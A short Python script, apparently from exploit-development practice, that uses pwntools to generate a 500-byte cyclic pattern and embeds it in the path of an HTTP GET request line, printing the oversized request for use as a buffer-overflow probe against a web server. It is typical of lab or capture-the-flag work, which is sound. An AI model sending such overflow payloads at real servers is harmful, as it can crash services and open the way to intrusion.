import pwn

generator = pwn.util.cyclic.cyclic_gen()
overflow = generator.get(500).decode('ascii')

mode = 'GET'
path = '/' + overflow 
protocol = 'HTTP/1.1'
payload = ''

payload = '{} {} {} {}'.format(mode, path, protocol, payload)
print(payload)
